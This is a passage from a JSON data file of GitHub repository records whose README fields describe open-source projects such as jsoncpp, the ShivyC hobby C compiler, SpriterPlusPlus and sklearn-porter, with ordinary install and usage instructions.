<https:\/\/sunflyer.cn\/archives\/239>\n\n## \u4f5c\u8005\nLeon - <miao1007@gmail.com>\n\n\n## License\n\n1. GPL\n2. \u52ff\u505a**TAOBAO**\u7528\u9014\n"},{"repo":"\/kennethreitz\/context","language":"HTML","readme_contents":"error: no README"},{"repo":"\/tencent-wechat\/libco","language":"C++","readme_contents":"\u672c\u5e93\u5df2\u8f6c\u81f3 <a>http:\/\/github.com\/Tencent\/libco<\/a>\n"},{"repo":"\/open-source-parsers\/jsoncpp","language":"C++","readme_contents":"# JsonCpp\n\n[![badge](https:\/\/img.shields.io\/badge\/conan.io-jsoncpp%2F1.8.0-green.svg?logo=data:image\/png;base64%2CiVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAA1VBMVEUAAABhlctjlstkl8tlmMtlmMxlmcxmmcxnmsxpnMxpnM1qnc1sn85voM91oM11oc1xotB2oc56pNF6pNJ2ptJ8ptJ8ptN9ptN8p9N5qNJ9p9N9p9R8qtOBqdSAqtOAqtR%2BrNSCrNJ\/rdWDrNWCsNWCsNaJs9eLs9iRvNuVvdyVv9yXwd2Zwt6axN6dxt%2Bfx%2BChyeGiyuGjyuCjyuGly%2BGlzOKmzOGozuKoz%2BKqz%2BOq0OOv1OWw1OWw1eWx1eWy1uay1%2Baz1%2Baz1%2Bez2Oe02Oe12ee22ujUGwH3AAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfgBQkREyOxFIh\/AAAAiklEQVQI12NgAAMbOwY4sLZ2NtQ1coVKWNvoc\/Eq8XDr2wB5Ig62ekza9vaOqpK2TpoMzOxaFtwqZua2Bm4makIM7OzMAjoaCqYuxooSUqJALjs7o4yVpbowvzSUy87KqSwmxQfnsrPISyFzWeWAXCkpMaBVIC4bmCsOdgiUKwh3JojLgAQ4ZCE0AMm2D29tZwe6AAAAAElFTkSuQmCC)](https:\/\/bintray.com\/theirix\/conan-repo\/jsoncpp%3Atheirix)\n[![badge](https:\/\/img.shields.io\/badge\/license-MIT-blue)](https:\/\/github.com\/open-source-parsers\/jsoncpp\/blob\/master\/LICENSE)\n[![badge](https:\/\/img.shields.io\/badge\/document-doxygen-brightgreen)](http:\/\/open-source-parsers.github.io\/jsoncpp-docs\/doxygen\/index.html)\n[![Coverage Status](https:\/\/coveralls.io\/repos\/github\/open-source-parsers\/jsoncpp\/badge.svg?branch=master)](https:\/\/coveralls.io\/github\/open-source-parsers\/jsoncpp?branch=master)\n\n\n[JSON][json-org] is a lightweight data-interchange format. It can represent\nnumbers, strings, ordered sequences of values, and collections of name\/value\npairs.\n\n[json-org]: http:\/\/json.org\/\n\nJsonCpp is a C++ library that allows manipulating JSON values, including\nserialization and deserialization to and from strings. It can also preserve\nexisting comment in unserialization\/serialization steps, making it a convenient\nformat to store user input files.\n\n\n## Documentation\n\n[JsonCpp documentation][JsonCpp-documentation] is generated using [Doxygen][].\n\n[JsonCpp-documentation]: http:\/\/open-source-parsers.github.io\/jsoncpp-docs\/doxygen\/index.html\n[Doxygen]: http:\/\/www.doxygen.org\n\n\n## A note on backward-compatibility\n\n* `1.y.z` is built with C++11.\n* `0.y.z` can be used with older compilers.\n* Major versions maintain binary-compatibility.\n\n\n## Using JsonCpp in your project\n\n### The vcpkg dependency manager\nYou can download and install JsonCpp using the [vcpkg](https:\/\/github.com\/Microsoft\/vcpkg\/) dependency manager:\n\n    git clone https:\/\/github.com\/Microsoft\/vcpkg.git\n    cd vcpkg\n    .\/bootstrap-vcpkg.sh\n    .\/vcpkg integrate install\n    vcpkg install jsoncpp\n\nThe JsonCpp port in vcpkg is kept up to date by Microsoft team members and community contributors. If the version is out of date, please [create an issue or pull request](https:\/\/github.com\/Microsoft\/vcpkg) on the vcpkg repository.\n\n### Amalgamated source\nhttps:\/\/github.com\/open-source-parsers\/jsoncpp\/wiki\/Amalgamated-(Possibly-outdated)\n\n### The Meson Build System\nIf you are using the [Meson Build System](http:\/\/mesonbuild.com), then you can get a wrap file by downloading it from [Meson WrapDB](https:\/\/wrapdb.mesonbuild.com\/jsoncpp), or simply use `meson wrap install jsoncpp`.\n\n### Other ways\nIf you have trouble, see the [Wiki](https:\/\/github.com\/open-source-parsers\/jsoncpp\/wiki), or post a question as an Issue.\n\n## License\n\nSee the `LICENSE` file for details. In summary, JsonCpp is licensed under the\nMIT license, or public domain if desired and recognized in your jurisdiction.\n"},{"repo":"\/ShivamSarodia\/ShivyC","language":"Python","readme_contents":"# ShivyC [![Build Status](https:\/\/travis-ci.org\/ShivamSarodia\/ShivyC.svg?branch=master)](https:\/\/travis-ci.org\/ShivamSarodia\/ShivyC) [![Code Coverage](https:\/\/codecov.io\/gh\/ShivamSarodia\/ShivyC\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/ShivamSarodia\/ShivyC)\n\n### A hobby C compiler created in Python.\n\n![ShivyC demo GIF.](https:\/\/raw.githubusercontent.com\/ShivamSarodia\/ShivyC\/master\/demo.gif)\n\n---\n\nShivyC is a hobby C compiler written in Python 3 that supports a subset of the C11 standard and generates reasonably efficient binaries, including some optimizations. ShivyC also generates helpful compile-time error messages.\n\nThis [implementation of a trie](tests\/general_tests\/trie\/trie.c) is an example of what ShivyC can compile today. For a more comprehensive list of features, see the [feature test directory](tests\/feature_tests).\n\n## Quickstart\n\n### x86-64 Linux\nShivyC requires only Python 3.6 or later to compile C code. Assembling and linking are done using the GNU binutils and glibc, which you almost certainly already have installed.\n\nTo install ShivyC:\n```\npip3 install shivyc\n```\nTo create, compile, and run an example program:\n```c\n$ vim hello.c\n$ cat hello.c\n\n#include <stdio.h>\nint main() {\n  printf(\"hello, world!\\n\");\n}\n\n$ shivyc hello.c\n$ .\/out\nhello, world!\n```\nTo run the tests:\n```\ngit clone https:\/\/github.com\/ShivamSarodia\/ShivyC.git\ncd ShivyC\npython3 -m unittest discover\n```\n\n### Other Architectures\nFor the convenience of those not running Linux, the [`docker\/`](docker\/) directory provides a Dockerfile that sets up an x86-64 Linux Ubuntu environment with everything necessary for ShivyC. To use this, run:\n```\ngit clone https:\/\/github.com\/ShivamSarodia\/ShivyC.git\ncd ShivyC\ndocker build -t shivyc docker\/\ndocker\/shell\n```\nThis will open up a shell in an environment with ShivyC installed and ready to use with\n```\nshivyc any_c_file.c           # to compile a file\npython3 -m unittest discover  # to run tests\n```\nThe Docker ShivyC executable will update live with any changes made in your local ShivyC directory.\n\n## Implementation Overview\n#### Preprocessor\nShivyC today has a very limited preprocessor that parses out comments and expands `#include` directives. These features are implemented between [`lexer.py`](shivyc\/lexer.py) and [`preproc.py`](shivyc\/lexer.py).\n\n#### Lexer\nThe ShivyC lexer is implemented primarily in [`lexer.py`](shivyc\/lexer.py). Additionally, [`tokens.py`](shivyc\/tokens.py) contains definitions of the token classes used in the lexer and [`token_kinds.py`](shivyc\/token_kinds.py) contains instances of recognized keyword and symbol tokens.\n\n#### Parser\nThe ShivyC parser uses recursive descent techniques for all parsing. It is implented in [`parser\/*.py`](shivyc\/parser\/) and creates a parse tree of nodes defined in [`tree\/nodes.py`](shivyc\/tree\/nodes.py) and [`tree\/expr_nodes.py`](shivyc\/tree\/expr_nodes.py).\n\n#### IL generation\nShivyC traverses the parse tree to generate a flat custom IL (intermediate language). The commands for this IL are in [`il_cmds\/*.py`](shivyc\/il_cmds\/) . Objects used for IL generation are in [`il_gen.py`](shivyc\/il_gen.py) , but most of the IL generating code is in the `make_code` function of each tree node in [`tree\/*.py`](shivyc\/tree\/).\n\n#### ASM generation\nShivyC sequentially reads the IL commands, converting each into Intel-format x86-64 assembly code. ShivyC performs register allocation using George and Appel\u2019s iterated register coalescing algorithm (see References below). The general ASM generation functionality is in [`asm_gen.py`](shivyc\/asm_gen.py) , but much of the ASM generating code is in the `make_asm` function of each IL command in [`il_cmds\/*.py`](shivyc\/il_cmds\/).\n\n## Contributing\nPull requests to ShivyC are very welcome. A good place to start is the [Issues page](https:\/\/github.com\/ShivamSarodia\/ShivyC\/issues). All [issues labeled \"feature\"](https:\/\/github.com\/ShivamSarodia\/ShivyC\/issues?q=is%3Aopen+is%3Aissue+label%3Afeature) are TODO tasks. [Issues labeled \"bug\"](https:\/\/github.com\/ShivamSarodia\/ShivyC\/issues?q=is%3Aopen+is%3Aissue+label%3Abug) are individual miscompilations in ShivyC. If you have any questions, please feel free to ask in the comments of the relevant issue or create a new issue labeled \"question\". Of course, please add test(s) for all new functionality.\n\nMany thanks to our current and past contributers:\n* [ShivamSarodia](https:\/\/github.com\/ShivamSarodia)\n* [cclauss](https:\/\/github.com\/cclauss)\n* [TBladen](https:\/\/github.com\/tbladen)\n* [christian-stephen](https:\/\/github.com\/christian-stephen)\n* [jubnzv](https:\/\/github.com\/jubnzv)\n* [eriols](https:\/\/github.com\/eriols)\n\n## References\n- [ShivC](https:\/\/github.com\/ShivamSarodia\/ShivC) - ShivyC is a rewrite from scratch of my old C compiler, ShivC, with much more emphasis on feature completeness and code quality. See the ShivC README for more details.\n- C11 Specification - http:\/\/www.open-std.org\/jtc1\/sc22\/wg14\/www\/docs\/n1570.pdf\n- x86_64 ABI - https:\/\/github.com\/hjl-tools\/x86-psABI\/wiki\/x86-64-psABI-1.0.pdf\n- Iterated Register Coalescing (George and Appel) - https:\/\/www.cs.purdue.edu\/homes\/hosking\/502\/george.pdf\n"},{"repo":"\/lucidspriter\/SpriterPlusPlus","language":"HTML","readme_contents":"# SpriterPlusPlus\na C++ Implementation for Spriter animations\n\n## About\nSpriterPlusPlus aims to be as quick as possible playing back animations, and iterating additional characters once loaded.\nAdditional instances are flyweights that take up less ram than the initially the loaded model.\nEach flyweight instance minimizes cycles spent in random access and iteratating through containers using stored pointers and iterators wherever possible.\n\n## Included example\nSfml for display and sound playback\n\nTwo examples for loading: TinyXml and PugiXml\n\n## Supported Features\nBasic animations\nBone animations\nAll curve types (Instant, Linear, Quadratic, Cubic, Quartic, Quintic, Bezier)\nPoints\nCollision Rectangles\nSubEntities\nEvents (Triggers)\nSounds\nVariables\nTags\nCharacter Maps\nAnimation Blending\n\n## How to use\n\n##### All necessary files are in the 'spriterengine' folder.  The other included files are for example purposes.\n\n### Extend (All of the following can be found in spriterengine\/override) :\n#### FileFactory \n###### and pass to SpriterModel so it can use your own inherited versions of :\n* SpriterFileDocumentWrapper (and Element and Attribute Wrappers) to create parsing code.  You can specify a separate SpriterFileDocumentWrapper for scml (xml) and scon (json), which will be automatically selected upon loading based on the file extension\n* ImageFile to store shared texture\/image resources to be used by sprite objects\n* SoundFile to store shared sound resources to be used by sound objects, and create your custom extended version of SoundObjectInfoReference to playback and control volume of the shared sound resources\n\n#### ObjectFactory \n###### and pass to SpriterModel to enable debug rendering:\n* spriterengine\/objectinfo\/PointInstanceInfo \n* spriterengine\/objectinfo\/BoneInstanceInfo\n* spriterengine\/objectinfo\/BoxInstanceInfo \n \nSettings.cpp has static variables to control the display of points, bones, and boxes:\n\n* bool Settings::renderDebugPoints;\n* bool Settings::renderDebugBones;\n* bool Settings::renderDebugBoxes;\n\nenableDebugBones must be true while creating a new instance in order for renderDebugBones to have an effect:\n* bool Settings::enableDebugBones;\n\n* spriterengine\/objectinfo\/TriggerObjectInfo if you want to be able to perform a function upon being triggering events\n###### (Alternatively you can query a specific trigger for your instance using :\n* getTriggerObject(\"triggerName\")->getTriggerCount() \/\/ in case more than one event was triggered in the elapsed time\n\n\n\n\n### Creating an instance :\n* #include \"spriterengine\/spriterengine.h\"\n* ScmlModel scmlModel(fileName, new customFileFactory, new customObjectFactory\/*optional*\/);\n\n* EntityInstance *entityInstance = scmlModel.getNewEntityInstance(entityName or entityIndex);\n\n\n### Controlling playback :\n* entityInstance->setCurrentAnimation(animationName); \/\/ defaults to first animation\n* entityInstance->setCurrentAnimation(animationName, blendTimeInMilliseconds); \/\/ blends the current animation to the new one over time\n* entityInstance->setTimeElapsed(inMilliseconds); \n\n* entityInstance->pausePlayback(); \/\/ playback is automatically paused at the end of a non-looping animation\n* entityInstance->startResumePlayback(); \/\/ playback automatically resumes on a setCurrentAnimation() command\n\n\n##### after setting the elapsed Time:\n* entityInstance->render();\n\n##### and if you're using sound and\/or events:\n* entityInstance->playSoundTriggers();\n\n###### or\n\n* entityInstance->playEventTriggers();\n\n###### or\n\n* entityInstance->playAllTriggers();\n\n\n\n#### Controlling the entire character\n* entityInstance->setPosition(SpriterEngine::point(x,y))\n* entityInstance->setAngle(SpriterEngine::toRadians(angle));\n* entityInstance->setScale(SpriterEngine::point(w,h));\n\n\n#### Character Maps\n* entityInstance->applyCharacterMap(\"charMapOne\");\n* entityInstance->applyCharacterMap(\"charMapTwo\");\n* entityInstance->removeCharacterMap(\"charMapOne\");\n* entityInstance->removeAllCharacterMaps();\n\n\n#### Metadata\n##### to retrieve a variable value from an object :\n* entityInstance->getRealValue(\"objectName\",\"varName\"); \/\/ or getIntValue, or getStringValue\n\n##### to retrieve a variable from the entity itself :\n* entityInstance->getRealValue(\"varName\"); \/\/ or getIntValue, or getStringValue\n\n##### if you would like to store the variable to avoid repeated retrieval for performance reasons (should normally not be necessary):\n* UniversalObjectInterface *myVariable = entityInstance->getVariable(\"objectName\", \"varName\"); \/\/ to retrieve from an object or\n* UniversalObjectInterface *myVariable = entityInstance->getVariable(\"varName\"); \/\/ to retrieve from the entity itself\n \n######      and then use\n\n* myVariable->getRealValue(); \/\/ or getIntValue, or getStringValue\n\n\n##### to check if a tag is active :\n* bool myTagIsActive = entityInstance->tagIsActive(\"objectName\", \"tagName\");\n\n##### or if the tag is on the entity itself :\n* bool myTagIsActive = entityInstance->tagIsActive(\"tagName\");\n\n\n### Additional options\n#### Error output\nIn Settings.cpp there is a function pointer to a callback function to display error messages:\n* ErrorFunctionPointer Settings::errFunction; \n\nAny function with the signature void myErrorFunction(const std::string &errorMessage) can be used here. \n\nTwo basic error functions are provided:\n* nullError is the default, and takes no action\n* simpleError outputs the error message to std::cerr\n\nIn most cases, there should be no errors, unless you are loading an invalid file, attempting to retrieve the wrong type of data from an object or variable (myStringVariable->getIntValue()), or attempting to access a missing variable or object\n\n\n\t\n\n#### Loading options\nIn Settings.cpp you can set loading option, if your engine requires the y, pivotY, or angle to be reversed to display properly (you attempt to load a character in your engine and the positions, pivots, or angles seem reversed).\nThese are all defaulted to true, which is the setting that should work correctly for most engines.\n\n*\tSettings::reverseYOnLoad;\n*\tSettings::reversePivotYOnLoad;\n*\tSettings::reverseAngleOnLoad;\n\n\n## Feedback\nTo provide feedback, report errors, or give suggestions, please use the relevant Spriter [forum thread](http:\/\/brashmonkey.com\/forum\/index.php?\/topic\/4464-spriterplusplus-a-c-spriter-implementation\/ \"BrashMonkey forums\").\n"},{"repo":"\/nok\/sklearn-porter","language":"Python","readme_contents":"\n# sklearn-porter\n\n[![GitHub license](https:\/\/img.shields.io\/pypi\/l\/sklearn-porter.svg)](https:\/\/raw.githubusercontent.com\/nok\/sklearn-porter\/master\/license.txt)\n[![Stack Overflow](https:\/\/img.shields.io\/badge\/stack%20overflow-ask%20questions-blue.svg)](https:\/\/stackoverflow.com\/questions\/tagged\/sklearn-porter)\n[![Join the chat at https:\/\/gitter.im\/nok\/sklearn-porter](https:\/\/badges.gitter.im\/nok\/sklearn-porter.svg)](https:\/\/gitter.im\/nok\/sklearn-porter?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![Twitter](https:\/\/img.shields.io\/twitter\/follow\/darius_morawiec.svg?label=follow&style=popout)](https:\/\/twitter.com\/darius_morawiec)\n\nTranspile trained [scikit-learn](https:\/\/github.com\/scikit-learn\/scikit-learn) estimators to C, Java, JavaScript and others.<br>It's recommended for limited embedded systems and critical applications where performance matters most.\n\n\n## Important\n\nWe're hard working on the [first major release](https:\/\/github.com\/nok\/sklearn-porter\/tree\/release\/1.0.0) of sklearn-porter. <br>Until that we will just release bugfixes to the stable version.\n\n\n## Estimators\n\n<table>\n    <tbody>\n        <tr>\n            <td align=\"center\" width=\"32%\"><strong>Estimator<\/strong><\/td>\n            <td align=\"center\" colspan=\"6\" width=\"68%\"><strong>Programming language<\/strong><\/td>\n        <\/tr>\n        <tr>\n            <td align=\"left\" width=\"32%\">Classifier<\/td>\n            <td align=\"center\" width=\"13%\">Java *<\/td>\n            <td align=\"center\" width=\"11%\">JS<\/td>\n            <td align=\"center\" width=\"11%\">C<\/td>\n            <td align=\"center\" width=\"11%\">Go<\/td>\n            <td align=\"center\" width=\"11%\">PHP<\/td>\n            <td align=\"center\" width=\"11%\">Ruby<\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.svm.SVC.html\">svm.SVC<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/SVC\/java\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/SVC\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/SVC\/js\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/SVC\/c\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/SVC\/php\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/SVC\/ruby\/basics.pct.ipynb\">\u2713<\/a><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.svm.NuSVC.html\">svm.NuSVC<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/NuSVC\/java\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/NuSVC\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/NuSVC\/js\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/NuSVC\/c\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/NuSVC\/php\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/NuSVC\/ruby\/basics.pct.ipynb\">\u2713<\/a><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.svm.LinearSVC.html\">svm.LinearSVC<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/LinearSVC\/java\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/LinearSVC\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/LinearSVC\/js\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/LinearSVC\/c\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/LinearSVC\/go\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/LinearSVC\/php\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/LinearSVC\/ruby\/basics.pct.ipynb\">\u2713<\/a><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.tree.DecisionTreeClassifier.html\">tree.DecisionTreeClassifier<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/java\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/java\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a>, <a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/js\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/js\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/c\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/c\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/go\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/go\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/php\/basics.pct.ipynb\">\u2713<\/a>,  <a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/php\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/ruby\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/DecisionTreeClassifier\/ruby\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.ensemble.RandomForestClassifier.html\">ensemble.RandomForestClassifier<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/RandomForestClassifier\/java\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a>, <a href=\"examples\/estimator\/classifier\/RandomForestClassifier\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/RandomForestClassifier\/js\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/RandomForestClassifier\/c\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\">\u2713 \u1d31<\/td>\n            <td align=\"center\">\u2713 \u1d31<\/td>\n            <td align=\"center\">\u2713 \u1d31<\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.ensemble.ExtraTreesClassifier.html\">ensemble.ExtraTreesClassifier<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/ExtraTreesClassifier\/java\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a>, <a href=\"examples\/estimator\/classifier\/ExtraTreesClassifier\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/ExtraTreesClassifier\/js\/basics.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/ExtraTreesClassifier\/c\/basics.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\">\u2713 \u1d31<\/td>\n            <td align=\"center\">\u2713 \u1d31<\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.ensemble.AdaBoostClassifier.html\">ensemble.AdaBoostClassifier<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/AdaBoostClassifier\/java\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a>, <a href=\"examples\/estimator\/classifier\/AdaBoostClassifier\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/AdaBoostClassifier\/js\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a>, <a href=\"examples\/estimator\/classifier\/AdaBoostClassifier\/js\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/AdaBoostClassifier\/c\/basics_embedded.pct.ipynb\">\u2713 \u1d31<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.neighbors.KNeighborsClassifier.html\">neighbors.KNeighborsClassifier<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/KNeighborsClassifier\/java\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/KNeighborsClassifier\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/KNeighborsClassifier\/js\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/KNeighborsClassifier\/js\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.naive_bayes.GaussianNB.html#sklearn.naive_bayes.GaussianNB\">naive_bayes.GaussianNB<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/GaussianNB\/java\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/GaussianNB\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/GaussianNB\/js\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.naive_bayes.BernoulliNB.html#sklearn.naive_bayes.BernoulliNB\">naive_bayes.BernoulliNB<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/BernoulliNB\/java\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/BernoulliNB\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/BernoulliNB\/js\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.neural_network.MLPClassifier.html\">neural_network.MLPClassifier<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/MLPClassifier\/java\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/MLPClassifier\/java\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/classifier\/MLPClassifier\/js\/basics.pct.ipynb\">\u2713<\/a>, <a href=\"examples\/estimator\/classifier\/MLPClassifier\/js\/basics_imported.pct.ipynb\">\u2713 \u1d35<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n        <\/tr>\n        <tr>\n            <td align=\"left\" width=\"32%\">Regressor<\/td>\n            <td align=\"center\" width=\"13%\">Java *<\/td>\n            <td align=\"center\" width=\"11%\">JS<\/td>\n            <td align=\"center\" width=\"11%\">C<\/td>\n            <td align=\"center\" width=\"11%\">Go<\/td>\n            <td align=\"center\" width=\"11%\">PHP<\/td>\n            <td align=\"center\" width=\"11%\">Ruby<\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.neural_network.MLPRegressor.html\">neural_network.MLPRegressor<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><a href=\"examples\/estimator\/regressor\/MLPRegressor\/js\/basics.pct.ipynb\">\u2713<\/a><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n            <td align=\"center\"><\/td>\n        <\/tr>\n    <\/tbody>\n<\/table>\n\n\u2713 = is full-featured,\u3000\u1d31 = with embedded model data,\u3000\u1d35 = with imported model data,\u3000* = default language\n\n\n## Installation\n\n### Stable\n\n[![Build Status stable branch](https:\/\/img.shields.io\/travis\/nok\/sklearn-porter\/stable.svg)](https:\/\/travis-ci.org\/nok\/sklearn-porter)\n[![PyPI](https:\/\/img.shields.io\/pypi\/v\/sklearn-porter.svg)](https:\/\/pypi.python.org\/pypi\/sklearn-porter)\n[![PyPI](https:\/\/img.shields.io\/pypi\/pyversions\/sklearn-porter.svg)](https:\/\/pypi.python.org\/pypi\/sklearn-porter)\n\n```bash\n$ pip install sklearn-porter\n```\n\n### Development\n\n[![Build Status master 